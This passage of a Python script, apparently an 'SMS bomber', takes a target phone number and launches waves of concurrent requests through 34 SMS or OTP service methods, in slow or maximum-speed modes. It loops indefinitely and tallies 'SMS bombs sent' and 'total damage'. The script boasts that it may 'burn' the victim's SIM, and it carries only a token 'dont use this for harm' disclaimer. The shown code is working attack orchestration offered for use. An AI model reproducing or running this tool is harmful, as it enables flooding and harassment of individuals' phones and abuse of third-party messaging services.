            timeout=timeout,
            connector=connector,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:
            
            print(f"{_c['c']}[FAST] WARNING SIM MIGHT BE DESTROY {_c['e']}")
            
            start_time = time.time()
            tasks = []
            OUTCOME = "██████████████████████████████████████████████████████████████████████"
            
            for wave in range(_fast_cfg[3]):
                tasks.extend([
                    self._fast_service(session, self._s1, OUTCOME),
                    self._fast_service(session, self._s2, OUTCOME),
                    self._fast_service(session, self._s4, OUTCOME),
                    self._fast_service(session, self._s3, OUTCOME),
                    self._fast_service(session, self._s17, OUTCOME),
                    self._fast_service(session, self._s18, OUTCOME),
                    self._fast_service(session, self._s5, OUTCOME),
                    self._fast_service(session, self._s6, OUTCOME),
                    self._fast_service(session, self._s7, OUTCOME),
                    self._fast_service(session, self._s14, OUTCOME),
                    self._fast_service(session, self._s9, OUTCOME),
                    self._fast_service(session, self._s19, OUTCOME),
                    self._fast_service(session, self._s22, OUTCOME),
                    self._fast_service(session, self._s24, OUTCOME),
                    self._fast_service(session, self._s26, OUTCOME),
                    self._fast_service(session, self._s27, OUTCOME),
                    self._fast_service(session, self._s20, OUTCOME),
                    self._fast_service(session, self._s21, OUTCOME),
                    self._fast_service(session, self._s8, OUTCOME),
                    self._fast_service(session, self._s10, OUTCOME),
                    self._fast_service(session, self._s11, OUTCOME),
                    self._fast_service(session, self._s12, OUTCOME),
                    self._fast_service(session, self._s25, OUTCOME),
                    self._fast_service(session, self._s13, OUTCOME),
                    self._fast_service(session, self._s15, OUTCOME),
                    self._fast_service(session, self._s16, OUTCOME),
                    self._fast_service(session, self._s31, OUTCOME),
                    self._fast_service(session, self._s32, OUTCOME),
                    self._fast_service(session, self._s33, OUTCOME),
                    self._fast_service(session, self._s28, OUTCOME),
                    self._fast_service(session, self._s29, OUTCOME),
                    self._fast_service(session, self._s30, OUTCOME),
                    self._fast_service(session, self._s23, OUTCOME),
                    self._fast_service(session, self._s34, OUTCOME),
                ])
                
                print(f"{_c['y']}Launching {len(tasks)} concurrent test operations across {_fast_cfg[3]} waves...{_c['e']}")
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful = sum(1 for r in results if r is True)
            failed = len(results) - successful
            
            end_time = time.time()
            
            print(f"\n{_c['g']}[ATTACK COMPLETE] attack finished!{_c['e']}")
            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] 500+ SMS requests sent (34+ APIs × 3 waves × fast speed){_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests successful{_c['e']}")

    async def _fast_service(self, session, service_method, label=""):
        try:
            print(f"{_c['c']}💣 {label} - Fast request{_c['e']}")
            await service_method(session)
            print(f"{_c['g']}💣 {label} - Completed{_c['e']}")
            return True
        except Exception as e:
            print(f"{_c['r']}💣 {label} - Error: {str(e)[:50]}{_c['e']}")
            return False

    async def run_all_services(self):
        global _current_mode
        if _current_mode == 'fast':
            await self._run_all_services_fast()
        else:
            await self._run_all_services_slowly()

async def _main():
    global _state, _current_mode
    
    _clear_screen()
    _print_banner()
    
    _animate_loading("💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣", 2)
    _animate_loading("💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣", 2)
    _animate_loading("THE ATTACK MIGHT BURN SIM OR DEVICE VIBRATION SYSTEM ALL THE BEST", 1.5)
    
    print(f"\n{_c['y']}💣 SELECT BOMBING MODE:{_c['e']}")
    print(f"{_c['g']}[1] SNAIL 🐌  - All 34+ APIs (Slow & Controlled){_c['e']}")
    print(f"{_c['r']}[2] CHEETAH 🐆 - All 34+ APIs (Maximum Speed){_c['e']}")
    
    while True:
        mode_choice = input(f"\n{_c['c']}[MODE] Choose mode (1 or 2): {_c['w']}").strip()
        if mode_choice == "1":
            _current_mode = 'slow'
            print(f"{_c['g']}✅ SLOW MODE selected{_c['e']}")
            break
        elif mode_choice == "2":
            _current_mode = 'fast'
            print(f"{_c['r']}✅ FAST MODE selected{_c['e']}")
            break
        else:
            print(f"{_c['r']}❌ Invalid choice! Please enter 1 or 2.{_c['e']}")
    
    while True:
        phone_input = input(f"\n{_c['g']}[TARGET] Enter phone number: {_c['w']}").strip()
        if phone_input and len(phone_input) >= 10:
            break
        print(f"{_c['r']}[ERROR] Invalid phone number! Try again.{_c['e']}")
    
    phone_data = _format_phone_number(phone_input)
    print(f"{_c['c']}[INFO] Target: {_c['y']}{phone_data['with_0']}{_c['e']}")
    
    if _current_mode == 'fast':
        print(f"\n{_c['r']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['r']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['y']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['g']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['c']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['p']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
    else:
        print(f"\n{_c['r']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['r']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['y']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['g']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['c']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
        print(f"{_c['p']}💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣{_c['e']}")
    print(f"{_c['p']}{'=' * 60}{_c['e']}")
    
    service_manager = _ServiceManager(phone_data)
    
    cycle_count = 0
    start_time = time.time()
    
    try:
        while True:
            if _state['exit']:
                break
                
            while _state['paused']:
                await asyncio.sleep(1)
                if _state['exit']:
                    break
            
            if _state['exit']:
                break
            
            cycle_count += 1
            current_time = _get_time()
            
            print(f"\n{_c['r']}{_c['B']}[SLOW ATTACK CYCLE #{cycle_count}] {_c['y']}{current_time}{_c['e']}")
            print(f"{_c['g']}[TARGET] {_c['y']}{phone_data['with_0']}{_c['e']}")
            print(f"{_c['g']}[TOTAL REQUESTS] {_c['y']}{_state['total']}{_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
            
            await service_manager.run_all_services()
            
            elapsed = time.time() - start_time
            attack_type = "CHEETAH" if _current_mode == 'fast' else "SNAIL"
            print(f"\n{_c['g']}[CYCLE COMPLETE] {attack_type} Attack #{cycle_count} finished{_c['e']}")
            print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
            if _current_mode == 'fast':
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via CHEETAH{_c['e']}")
            else:
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent {_c['e']}")
            
            print(f"{_c['c']}[COOLDOWN] Next attack cycle in:{_c['e']}")
            for i in range(_cfg[1], 0, -1):
                if _state['exit'] or _state['paused']:
                    break
                frame = _frames[i % len(_frames)]
                sys.stdout.write(f'\r{_c["r"]}[{frame}] Next cycle in {i}s...{_c["e"]}')
                sys.stdout.flush()
                time.sleep(1)
            
            print(f"\n{_c['p']}{'=' * 60}{_c['e']}")
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}💥 CRITICAL ERROR: {e}{_c['e']}")
        print(f"{_c['y']}🔄 Restarting slow bomber...{_c['e']}")
        await _main()

if __name__ == "__main__":
    print(f"{_c['g']} TENSION SMS BOMBER{_c['e']}")
    print(f"{_c['c']}DONT USE THIS FOR HARM{_c['e']}")
    print(f"{_c['p']}Created by: SYLHETYHACKVENGER THE-ERROR808 {_c['e']}\n")
    
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}💥 STARTUP ERROR: {e}{_c['e']}")
        print(f"{_c['y']}Please check your Python installation and dependencies{_c['e']}")